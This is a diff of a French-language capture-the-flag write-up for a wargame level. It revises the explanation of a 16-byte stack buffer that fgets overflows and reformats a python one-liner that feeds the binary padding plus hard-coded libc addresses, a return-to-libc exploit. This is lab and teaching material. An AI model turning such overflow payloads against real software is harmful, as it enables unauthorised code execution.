@@ -29,12 +29,15 @@ cependant il ne fonctionne pas en password.
    0x08048574 <+164>:	call   0x8048370 <fgets@plt>
 
 Ici le fgets qui va recuperer notre password, sera limite a 100 char (0x64)
-cependant le buffer qui lui ai envoye en $esp + 0x1c est de 16 octets comme
-nous l'indique ce qui semble etre un bzero effectue dessus:
+cependant le buffer qui lui ai envoye en $esp + 0x1c est de 16 octets, nous
+pouvons le verifier au debut du programme ou un "bzero" manuel est effectue.
 
    0x080484db <+11>:	lea    0x1c(%esp),%ebx
    0x080484df <+15>:	mov    $0x0,%eax
    0x080484e4 <+20>:	mov    $0x10,%edx
+   0x080484e9 <+25>:	mov    %ebx,%edi
+   0x080484eb <+27>:	mov    %edx,%ecx
+   0x080484ed <+29>:	rep stos %eax,%es:(%edi)
 
 Notre programme devrait donc segfault..
 
@@ -68,7 +71,7 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 Les adresses necessaire a la creation du script on ete recuperer, l'offset aussi
 nous n'avons plus qu'a run celui-ci.
 
-level01@OverRide:~$ (python -c 'print "dat_wil\n"+"A"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level01
+level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
